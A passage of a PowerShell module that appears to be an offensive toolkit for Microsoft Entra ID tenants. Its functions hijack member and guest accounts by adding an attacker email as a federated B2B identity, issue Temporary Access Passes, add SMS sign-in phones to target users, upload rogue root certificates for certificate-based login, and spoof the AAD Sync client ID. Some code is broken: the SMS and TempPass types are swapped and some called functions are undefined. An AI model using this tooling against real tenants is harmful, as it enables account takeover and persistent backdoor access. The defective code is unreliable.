    .Example
    # Hijack a member with/without mailbox with User.Invite.All + User.ManageIdentities.All permission
    $victim = "hagrid29@XXX.onmicrosoft.com"
    $attackerMail = "XXX@external.com" 
    New-AAAUserB2BIdentities -UserId $victim -mail $attackerMail
    Send-AAAB2BInvitation -action sendInvitation -mail $attackerMail -Displayname "Tommy Cheung"

    .Example
    # Hijack a guest account with User.ReadWrite.All + User.ManageIdentities.All permission
    $victim = "XXX"
    $attackerMail = "XXX@external.com"  
    New-AAAUserB2BIdentities -UserId $UserId -mail $mail
    Set-AAAUserMail -UserId $UserId -mail $mail

#>
    [cmdletbinding()]
    Param(
        [Parameter(Mandatory= $true)]
        [string]$UserId,
        [Parameter(Mandatory= $true)]
        [string]$mail
    )
	
    $GraphToken = Get-AAAGraphToken

    $URL = "https://graph.microsoft.com/v1.0/users/$UserId"
    
    $IdList = (Get-AAAUser -UserId $UserId).identities
    $IdList += @{
                    signInType = "federated"
                    issuer = "mail"
                    issuerAssignedId = $mail
                }

    $Params = @{ 
        "URI" = $URL 
        "Method" = "PATCH" 
        "Headers" = @{ 
            "User-Agent" = Get-AAAUserAgent
            "Content-Type" = "application/json" 
            "Authorization" = "Bearer $GraphToken" 
        } 
        "Body" = @{
            identities = $IdList
        } | ConvertTo-Json
    } 

    $Result = Invoke-RestMethod @Params -UseBasicParsing 

    Write-Host "New B2B identity added"
}



<#
    User.Read.All and User.ManageIdentities.All (apply to all user), Directory.ReadWrite.All (apply to non-admin user)
#>
function Remove-AAAUserB2BIdentities {
<#
    .SYNOPSIS
    Remove federated identity in Identities property of a user

    DESCRIPTION
    Remove federated identity in Identities property of a user

    .Parameter UserId
    Remove federated identity in Identities property of a user with specified UserId (user principle name or user object ID)

    .Parameter mail
    The email address of federated identity to be removed
    
    .Example
    Remove-AAAUserB2BIdentities -UserId "hagrid@XXX.onmicrosoft.com" -mail "XXX@XXX.com"
#>
    [cmdletbinding()]
    Param(
        [Parameter(Mandatory= $true)]
        [string]$UserId,
        [Parameter(Mandatory= $true)]
        [string]$mail
    )
	
    $GraphToken = Get-AAAGraphToken

    $URL = "https://graph.microsoft.com/v1.0/users/$UserId"
    $IdList = (Get-AAAUser -UserId $UserId).identities | ?{$_.issuerAssignedId -ne $mail}

    if($IdList.Count -eq $null){
        $IdList = @($IdList)
    }

    $Params = @{ 
        "URI" = $URL 
        "Method" = "PATCH" 
        "Headers" = @{ 
            "User-Agent" = Get-AAAUserAgent
            "Content-Type" = "application/json" 
            "Authorization" = "Bearer $GraphToken" 
        } 
        "Body" = @{
            identities = $IdList
        } | ConvertTo-Json
    } 

    $Result = Invoke-RestMethod @Params -UseBasicParsing 

    Write-Host "B2B identity removed"

}



<#
    Policy.Read.All, Policy.ReadWrite.AuthenticationMethod
#>
function Get-AAAAutenMethod {
<#
    .SYNOPSIS
    List detail of authentication methods policies

    DESCRIPTION
    List detail of authentication methods policies

    .Example
    Get-AAAAutenMethod
#>
    $GraphToken = Get-AAAGraphToken

    $URL = "https://graph.microsoft.com/beta/policies/authenticationMethodsPolicy"
    
    
    $Params = @{ 
        "URI" = $URL 
        "Method" = "GET" 
        "Headers" = @{
            "User-Agent" = Get-AAAUserAgent 
            "Content-Type" = "application/json" 
            "Authorization" = "Bearer $GraphToken" 
        } 
    } 

    $Result = Invoke-RestMethod @Params -UseBasicParsing 
    $Result.authenticationMethodConfigurations

}


<#
    Policy.ReadWrite.AuthenticationMethod
#>
function Set-AAAAutenMethod {
<#
    .SYNOPSIS
    Enable or disable authentication methods

    DESCRIPTION
    Enable or disable authentication methods of SMS, Temporary Access Pass and Certificate-based authentication

    .Example
    Set-AAAAutenMethod -CertAuth

    .Example
    Set-AAAAutenMethod -TempPass -Disable
#>
    [cmdletbinding()]
    Param(
        [Parameter(Mandatory= $true, ParameterSetName=’SMS’)]
        [switch]$SMS,
        [Parameter(Mandatory= $true, ParameterSetName=’TempPass’)]
        [switch]$TempPass,
        [Parameter(Mandatory= $true, ParameterSetName=’CertAuth’)]
        [switch]$CertAuth,
        [Parameter(Mandatory= $false)]
        [switch]$Disable

    )
	
    $state = "enabled"
    if($PSBoundParameters.ContainsKey('Disable')){
        $state = "disabled"
    }

    $GraphToken = Get-AAAGraphToken

    if($PSBoundParameters.ContainsKey('SMS')){
        $URL = "https://graph.microsoft.com/beta/policies/authenticationMethodsPolicy/authenticationMethodConfigurations/sms"
        $odata_type = "#microsoft.graph.temporaryAccessPassAuthenticationMethodConfiguration"
    }
    elseif($PSBoundParameters.ContainsKey('TempPass')){
        $URL = "https://graph.microsoft.com/beta/policies/authenticationMethodsPolicy/authenticationMethodConfigurations/TemporaryAccessPass"
        $odata_type = "#microsoft.graph.smsAuthenticationMethodConfiguration"
    }
    elseif($PSBoundParameters.ContainsKey('CertAuth')){
        $URL = "https://graph.microsoft.com/beta/policies/authenticationMethodsPolicy/authenticationMethodConfigurations/X509Certificate"
        $odata_type = "#microsoft.graph.x509CertificateAuthenticationMethodConfiguration"
    }

    
    $Params = @{ 
        "URI" = $URL 
        "Method" = "PATCH" 
        "Headers" = @{ 
            "User-Agent" = Get-AAAUserAgent
            "Content-Type" = "application/json" 
            "Authorization" = "Bearer $GraphToken" 
        } 
        "Body" = @{
            "@odata.type" = $odata_type
            state = $state
        } | ConvertTo-Json
    } 

    $Result = Invoke-RestMethod @Params -UseBasicParsing 

}


<#
    UserAuthenticationMethod.Read.All, UserAuthenticationMethod.ReadWrite.All
#>
function Get-AAAUserAuthMethod {
<#
    .SYNOPSIS
    List authentication methods of a user

    DESCRIPTION
    List authentication methods of a user
    
    .Parameter UserId
    List authentication methods of a user with specified UserId (user principle name or user object ID)

    .Example
    Get-AAAUserAuthMethod -UserId "hagrid@XXX.onmicrosoft.com"
#>
    [cmdletbinding()]
    Param(
        [Parameter(Mandatory= $true)]
        [string]$UserId
    )
	
    $GraphToken = Get-AAAGraphToken

    $URL = "https://graph.microsoft.com/v1.0/users/$UserId/authentication/methods"
    
    
    $Params = @{ 
        "URI" = $URL 
        "Method" = "GET" 
        "Headers" = @{ 
            "User-Agent" = Get-AAAUserAgent
            "Content-Type" = "application/json" 
            "Authorization" = "Bearer $GraphToken" 
        } 
    } 

    $Result = Invoke-RestMethod @Params -UseBasicParsing 
    $Result.value

}


<#
    	UserAuthenticationMethod.ReadWrite.All
#>
function Set-AAAUserAuthPhone {
<#
    .SYNOPSIS
    Setup phone number for sign-in MFA method

    DESCRIPTION
    Setup phone number for sign-in MFA method
    
    .Parameter UserId
    Setup phone number for sign-in MFA method of a user with specified UserId (user principle name or user object ID)

    .Parameter phoneNumber
    The phone number for recieving SMS OTP code

    .Example
    Set-AAAAutenMethod -sms
    Set-AAAUserAuthPhone -UserId "hagrid@XXX.onmicrosoft.com" -phoneNumber "+852XXXXXXX"
#>

    [cmdletbinding()]
    Param(
        [Parameter(Mandatory= $true)]
        [string]$UserId,
        [Parameter(Mandatory= $true)]
        [string]$phoneNumber
    )
	
    $GraphToken = Get-AAAGraphToken

    $URL = "https://graph.microsoft.com/v1.0/users/$UserId/authentication/phoneMethods"
    
    $Params = @{ 
        "URI" = $URL 
        "Method" = "POST" 
        "Headers" = @{ 
            "User-Agent" = Get-AAAUserAgent
            "Content-Type" = "application/json" 
            "Authorization" = "Bearer $GraphToken" 
        } 
        "Body" = @{
            phoneNumber = $phoneNumber
            phoneType = "mobile"
        } | ConvertTo-Json
    } 

    $Result = Invoke-RestMethod @Params -UseBasicParsing 
    Write-Host "Authen method of phone setup"
    if($Result.smsSignInState -eq "ready"){
        Write-Host "Support SMS Sign-in, ready to sign-in with phone number"
    }
    if($Result.smsSignInState -eq "notConfigured"){
        Write-Host "Support SMS Sign-in. Trying to enable the configuration"
        Set-AAAUserAuthPhoneSignIn -UserId $UserId -phoneId $Result.Id

    }
}


<#
    	UserAuthenticationMethod.ReadWrite.All
#>
function Set-AAAUserAuthPhoneSignIn {
<#
    .SYNOPSIS
    Enable phone sign-in MFA method of a user

    DESCRIPTION
    Enable phone sign-in MFA method of a user
    
    .Parameter UserId
    Enable phone sign-in MFA method of a user with specified UserId (user principle name or user object ID)

    .Parameter phoneId
    ID of phone sing-in method

    .Example
    Set-AAAUserAuthPhoneSignIn -UserId "hagrid@XXX.onmicrosoft.com" -phoneId "XXXX"
#>
    [cmdletbinding()]
    Param(
        [Parameter(Mandatory= $true)]
        [string]$UserId,
        [Parameter(Mandatory= $true)]
        [string]$phoneId
    )
	
    $GraphToken = Get-AAAGraphToken

    $URL = "https://graph.microsoft.com/v1.0/users/$UserId/authentication/phoneMethods/$phoneId/enableSmsSignIn"
    
    $Params = @{ 
        "URI" = $URL 
        "Method" = "POST" 
        "Headers" = @{ 
            "User-Agent" = Get-AAAUserAgent
            "Content-Type" = "application/json" 
            "Authorization" = "Bearer $GraphToken" 
        } 
    } 

    $Result = Invoke-RestMethod @Params -UseBasicParsing 
    Write-Host "SMS sign-in configuration enabled"

}


<#
    	UserAuthenticationMethod.ReadWrite.All
#>
function Remove-AAAUserAuthPhone {
<#
    .SYNOPSIS
    Remove phone sign-in MFA method of a user

    DESCRIPTION
    Remove phone sign-in MFA method of a user
    
    .Parameter UserId
    Remove phone sign-in MFA method of a user with specified UserId (user principle name or user object ID)

    .Parameter phoneId
    ID of phone sing-in method

    .Example
    Remove-AAAUserAuthPhone -UserId "hagrid@XXX.onmicrosoft.com" -phoneNumber "+852XXXXXXX"
    Set-AAAAutenPolicy -sms -Disable
#>
    [cmdletbinding()]
    Param(
        [Parameter(Mandatory= $true)]
        [string]$UserId,
        [Parameter(Mandatory= $true)]
        [string]$phoneId
    )
	
    $GraphToken = Get-AAAGraphToken

    $URL = "https://graph.microsoft.com/v1.0/users/$UserId/authentication/phoneMethods/$phoneId"
    
    
    $Params = @{ 
        "URI" = $URL 
        "Method" = "DELETE" 
        "Headers" = @{ 
            "User-Agent" = Get-AAAUserAgent
            "Content-Type" = "application/json" 
            "Authorization" = "Bearer $GraphToken" 
        } 
    } 

    $Result = Invoke-RestMethod @Params -UseBasicParsing 

}


<#
    	UserAuthenticationMethod.ReadWrite.All
#>
function Set-AAAUserAuthTempPass {
<#
    .SYNOPSIS
    Setup Temporary Access Pass authentication method of a user

    DESCRIPTION
    Setup Temporary Access Pass authentication method of a user
    
    .Parameter UserId
    Setup Temporary Access Pass authentication method of a user with specified UserId (user principle name or user object ID)

    .Example
    Set-AAAAutenMethod -TempPass
    Set-AAAUserAuthTempPass -UserId "hagrid@XXX.onmicrosoft.com"
#>
    [cmdletbinding()]
    Param(
        [Parameter(Mandatory= $true)]
        [string]$UserId
    )
	
    $GraphToken = Get-AAAGraphToken

    $URL = "https://graph.microsoft.com/v1.0/users/$UserId/authentication/temporaryAccessPassMethods"
    
    
    $Params = @{ 
        "URI" = $URL 
        "Method" = "POST" 
        "Headers" = @{ 
            "User-Agent" = Get-AAAUserAgent
            "Content-Type" = "application/json" 
            "Authorization" = "Bearer $GraphToken" 
        } 
        "Body" = @{
            #use default setting
            #startDateTime = 
            #lifetimeInMinutes = 60
            isUsableOnce = $false
        } | ConvertTo-Json
    } 

    $Result = Invoke-RestMethod @Params -UseBasicParsing 
    $Result
}

<#
    	UserAuthenticationMethod.ReadWrite.All
#>
function Remove-AAAUserAuthTempPass {
<#
    .SYNOPSIS
    Remove a Temporary Access Pass for a user

    DESCRIPTION
    Remove a Temporary Access Pass for a user
    
    .Parameter UserId
    Remove a Temporary Access Pass for a user with specified UserId (user principle name or user object ID)

    .Parameter TempPassId
    ID of Temporary Access Pass

    .Example
    Remove-AAAUserAuthTempPass -UserId "hagrid@XXX.onmicrosoft.com" -TempPassId "XXXX"
    Set-AAAAutenPolicy -TempPass -Disable
#>
    [cmdletbinding()]
    Param(
        [Parameter(Mandatory= $true)]
        [string]$UserId,
        [Parameter(Mandatory= $true)]
        [string]$TempPassId
    )
	
    $GraphToken = Get-AAAGraphToken

    $URL = "https://graph.microsoft.com/v1.0/users/$UserId/authentication/temporaryAccessPassMethods/$TempPassId"
    
    
    $Params = @{ 
        "URI" = $URL 
        "Method" = "DELETE" 
        "Headers" = @{ 
            "User-Agent" = Get-AAAUserAgent
            "Content-Type" = "application/json" 
            "Authorization" = "Bearer $GraphToken" 
        } 
    } 

    $Result = Invoke-RestMethod @Params -UseBasicParsing 
    Write-Host "Authen method of temp access pass setup"

}



<#
    	Organization.Read.All, Organization.ReadWrite.All
#>
function Get-AAAUserAuthCert {
<#
    .SYNOPSIS
    List details of all certificate authorities for Certificate-based authentication

    .DESCRIPTION
    List details of all certificate authorities for Certificate-based authentication
    
    .Parameter TenantId
    Tenant ID. Default value set to tenant ID extracted from current graph token
    
    .Example
    Get-AAAUserAuthCert
#>
    [cmdletbinding()]
    Param(
        [Parameter(Mandatory= $false)]
        [string]$TenantId
    )
	
    $GraphToken = Get-AAAGraphToken

    if($TenantId -eq ""){
        $TenantId = (Get-AAADataFromGraphToke -Token $GraphToken).tid
    }

    $URL = "https://graph.microsoft.com/v1.0/organization/$TenantId/certificateBasedAuthConfiguration"
    
    $Params = @{ 
        "URI" = $URL 
        "Method" = "GET" 
        "Headers" = @{ 
            "User-Agent" = Get-AAAUserAgent
            "Content-Type" = "application/json" 
            "Authorization" = "Bearer $GraphToken" 
        } 
    } 

    $Result = Invoke-RestMethod @Params -UseBasicParsing 
    $Result.value.certificateAuthorities
}



<#
        Organization.ReadWrite.All
#>
function Update-AAAUserAuthCert {

    [cmdletbinding()]
    Param(
        [Parameter(Mandatory= $true, ParameterSetName=’NewCertList’)]
        [Object[]]$NewCertList,
        [Parameter(Mandatory= $true, ParameterSetName=’EmptyCert’)]
        [switch]$EmptyCert,
        [Parameter(Mandatory= $false)]
        [string]$TenantId
    )
	
    $GraphToken = Get-AAAGraphToken
    
    if($TenantId -eq ""){
        $TenantId = (Get-AAADataFromGraphToke -Token $GraphToken).tid
    }
    
    if($PSBoundParameters.ContainsKey('EmptyCert')){
        $NewCertList = @()
    }

    $URL = "https://graph.microsoft.com/v1.0/organization/$TenantId/certificateBasedAuthConfiguration"
    $Params = @{ 
        "URI" = $URL 
        "Method" = "POST" 
        "Headers" = @{ 
            "User-Agent" = Get-AAAUserAgent
            "Content-Type" = "application/json" 
            "Authorization" = "Bearer $GraphToken" 
        } 
        "Body" = @{
            certificateAuthorities = $NewCertList
        } | ConvertTo-Json
    } 

    $Result = Invoke-RestMethod @Params -UseBasicParsing 
    Write-Host "Current list of certificate"
    $Result.certificateAuthorities | select issuer,issuerSki
    
}



function New-AAAUserAuthCert {
<#
    .SYNOPSIS
    Upload a x509 certificate file for Certificate-based authentication

    .DESCRIPTION
    Upload a x509 certificate file containing certificate authority certificates for Certificate-based authentication
    
    .Parameter TenantId
    Tenant ID
    
    .Parameter CertFile
    File path of x509 certificate file that contain certificate authority certificates 
    
    .Example
    Set-AAAAutenMethod -CertAuth
    linux# ./AAAUserAuthCert.sh -g crt  
    New-AAAUserAuthCert -CertFile ".\ca.crt"
    linux# ./AAAUserAuthCert.sh -g pfx -u hagrid@XXX.onmicrosoft.com -s "/C=AU/ST=XX/L=XX/O=XXX/OU=IT/CN=hagrid@XXX.onmicrosoft.com"
#>
    [cmdletbinding()]
    Param(
        [Parameter(Mandatory= $false)]
        [string]$TenantId,
        [Parameter(Mandatory= $true)]
        [string]$CertFile
    )
	
    
    $CertList = Get-AAAUserAuthCert -TenantId $TenantId
    if($CertList.Count -ne 0){
        $CertList | %{$_.PSObject.Properties.Remove("issuer"); $_.PSObject.Properties.Remove("issuerSki")}
    }
    $NewCert = @{
                    isRootAuthority = $true
                    certificate = [Convert]::ToBase64String([System.IO.File]::ReadAllBytes($CertFile))
                }
    if($CertList.Count -eq $null){
        $CertList = @($CertList)
    }
    $NewCertList = $CertList + $NewCert

    Update-AAAUserAuthCert -TenantId $TenantId -NewCertList $NewCertList
}


function Remove-AAAUserAuthCert {
<#
    .SYNOPSIS
    Remove a certificate authority from Certificate-based authentication
    
    .DESCRIPTION
    Remove a certificate authority from Certificate-based authentication

    .Parameter TenantId
    Tenant ID
    
    .Parameter issuerSki
    The subject key identifier of target certificate
    
    .Example
    Remove-AAAUserAuthCert -issuerSki "XXXX"
#>
    [cmdletbinding()]
    Param(
        [Parameter(Mandatory= $false)]
        [string]$TenantId,
        [Parameter(Mandatory= $true)]
        [string]$issuerSki
    )
    
    $CertList = Get-AAAUserAuthCert -TenantId $TenantId
    $NewCertList = $CertList | ?{$_.issuerSki -ne $issuerSki}
    if($NewCertList.Count -eq 0){
        Update-AAAUserAuthCert -TenantId $TenantId -EmptyCert
    }
    else{
        $NewCertList | %{$_.PSObject.Properties.Remove("issuer"); $_.PSObject.Properties.Remove("issuerSki")}
        Update-AAAUserAuthCert -TenantId $TenantId -NewCertList $NewCertList
    }
    
}




function Get-AAAUserAgent {
    return "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
}


function Get-AAAGraphToken {
    return $Script:AAAtoken
}


# Gets the access token for AAD Graph API
# Need to import powershell script from AADInternals
function Get-AAATokenFromAADInt {
<#
    .SYNOPSIS
    Gets OAuth Access Token for AAD Graph
    
    .DESCRIPTION
    Gets OAuth Access Token for AAD Graph, which is used for example in Provisioning API.
    If credentials are not given, prompts for credentials (supports MFA).
    
    .Parameter Credentials
    Credentials of the user. If not given, credentials are prompted.
    
    .Parameter PRT
    PRT token of the user.
    
    .Parameter SAML
    SAML token of the user. 
    
    .Parameter UserPrincipalName
    UserPrincipalName of the user of Kerberos ticket
    
    .Parameter KerberosTicket
    Kerberos token of the user.
    
    .Parameter UseDeviceCode
    Use device code flow.

    .Parameter ClientId
    Client ID to use. Default set to Microsoft Azure PowerShell "1950a258-227b-4e31-a9cf-717495945fc2"

    .Parameter UserAgent
    User agent string used to request token

    .Example
    Get-AAATokenFromAADInt
    Get-AAADataFromGraphToken

    .Example
    # Login with devide code
    Get-AAATokenFromAADInt -UseDeviceCode

    .Example
    # spoof as AAD Sync account behaviour (Azure AD Sync app "cb1056e2-e479-49de-ae31-7812af012ed8", empty user agent)
    # Assinged with Directory.Read.All only 
    $cred=Get-Credential
    Get-AAATokenFromAADInt -Credentials $cred -ClientId "cb1056e2-e479-49de-ae31-7812af012ed8" -UserAgent ""

    .Example
    # login with Microsoft Office. Able to check own OneDrive 
    Get-AAAAccessTokenForAADGraph -ClientId "d3590ed6-52b3-4102-aeff-aad2292ab01c"
    Get-AAADataFromGraphToken
    Get-AAAOneDriveFolder -UserId "hagrid@xxx.onmicrosoft.com"

    .Example
    # Refersh expired token
    Get-AAATokenFromAADInt -Refresh

#>
    [cmdletbinding()]
    Param(
        [Parameter(ParameterSetName='Credentials',Mandatory=$False)]
        [System.Management.Automation.PSCredential]$Credentials,
        [Parameter(ParameterSetName='PRT',Mandatory=$True)]
        [String]$PRTToken,
        [Parameter(ParameterSetName='SAML',Mandatory=$True)]
        [String]$SAMLToken,
        [Parameter(ParameterSetName='Kerberos',Mandatory=$True)]
        [String]$KerberosTicket,
        [Parameter(ParameterSetName='Kerberos',Mandatory=$True)]
        [String]$Domain,
        [Parameter(ParameterSetName='DeviceCode',Mandatory=$True)]
        [switch]$UseDeviceCode,
        [Parameter(Mandatory=$False)]
        [String]$Tenant,
        [Parameter(Mandatory=$False)]
        [String]$ClientId,
        [Parameter(Mandatory=$False)]
        [String]$UserAgent="Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 10.0; WOW64; Trident/7.0; .NET4.0C; .NET4.0E; Tablet PC 2.0; Microsoft Outlook 16.0.4266)",
        [Parameter(Mandatory=$False)]
        [switch]$Refresh
    )

    if([string]::IsNullOrEmpty($ClientId)){
        # Azure Active Directory PowerShell
        # Commonly blocked by organization
        #$ClientId = "1b730954-1685-4b74-9bfd-dac224a7b894"

        # Microsoft Azure PowerShell
        $ClientId = "1950a258-227b-4e31-a9cf-717495945fc2"
    }

    $Resource = "https://graph.microsoft.com"


    if(-NOT $PSBoundParameters.ContainsKey('Refresh')){
        $GraphTokens = Get-AccessToken -Credentials $Credentials -Resource "https://graph.microsoft.com" -ClientId $ClientId -UserAgent $UserAgent -SAMLToken $SAMLToken -Tenant $Tenant -KerberosTicket $KerberosTicket -Domain $Domain -SaveToCache $false -PRTToken $PRTToken -UseDeviceCode $UseDeviceCode -IncludeRefreshToken $true
    }
    else{
        $GraphTokens = Get-AccessTokenWithRefreshToken -Resource $Resource -ClientId $ClientID -RefreshToken $Script:AAARefToken -TenantId (Get-AAADataFromGraphToken).tid -SaveToCache $false -IncludeRefreshToken $true
    }
    
    $Script:AAAtoken = $GraphTokens[0]
    $Script:AAARefToken = $GraphTokens[1]

    Write-Host "Access token saved to cache"       
    
}

function Get-AAATokenFromAzLogin {
<#
    .SYNOPSIS
    Obtain Graph token from Az logon

    .DESCRIPTION
    Obtain Graph token from Az logon

    .Parameter User
    User email or application ID for Az logon

    .Parameter Password
    Password for Az logon

    .Parameter TenantId
    Tenant ID 

    .Example
    Get-AAATokenFromAzLogin -User "XXX" -Password "XXX" -TenantId "XXX" -ServicePrincipal
#>

    [cmdletbinding()]
    Param(
        [Parameter(Mandatory= $false)]
        [string]$User,
        [Parameter(Mandatory= $false)]
        [string]$Password,
        [Parameter(Mandatory= $false)]
        [string]$TenantId,
        [Parameter(Mandatory= $false)]
        [switch]$ServicePrincipal
    )

    if(-NOT $PSBoundParameters.ContainsKey('User')){
        Connect-AzAccount            
    }
    else{
        $passwordstring = ConvertTo-SecureString $Password -AsPlainText -Force 
        $creds = New-Object System.Management.Automation.PSCredential($User, $passwordstring)  

        if($PSBoundParameters.ContainsKey('ServicePrincipal')){
            Connect-AzAccount -ServicePrincipal -Credential $creds -Tenant $TenantId
        }
        else{
            Connect-AzAccount -Credential $creds -Tenant $TenantId
        }
    }


    $Script:AAAtoken = (Get-AzAccessToken -ResourceUrl https://graph.microsoft.com).Token
    Write-Host "Access token saved to cache"

}

function Get-AAATotalCount {


    [cmdletbinding()]
    Param(
        [Parameter(Mandatory= $true)]
        [string]$URL,
        [Parameter(Mandatory= $true)]
        [string]$GraphToken
    )

    $URL_Count = $URL + "/`$count"
    
    $Params_Count = @{ 
        "URI" = $URL_Count 
        "Method" = "GET" 
        "Headers" = @{ 
        "User-Agent" = Get-AAAUserAgent
        "Content-Type" = "application/json" 
        "Authorization" = "Bearer $GraphToken" 
        "consistencylevel"= "eventual"
        } 
    } 
    $TotalCount = Invoke-RestMethod @Params_Count -UseBasicParsing
    $TotalCount
}

<#
    appid : application ID
    idtyp : identify type (user, app)
    oid   : object ID
    scp   : scope
    tid   : tenant ID
    wids  : directory role
    roles : app role
#>
function Get-AAADataFromGraphToken {
<#
    .SYNOPSIS
    Extract data from MS graph Token

    .DESCRIPTION
    Extract data from MS graph Token

    .Parameter Token
    MS graph token

    .Example
    Get-AAADataFromGraphToke -Token $GraphToken
#>

    [cmdletbinding()]
    Param(
        [Parameter(Mandatory= $false)]
        [string]$Token
    )

    if($PSBoundParameters.ContainsKey('Token')){
        $Token = $Token
    }
    else{
        $Token = Get-AAAGraphToken
    }

    $Token1 = $Token.Split(".")[1].Replace('-', '+').Replace('_', '/')
    while ($Token1.Length % 4) { $Token1 += "=" }
    [System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String($Token1)) | ConvertFrom-Json
}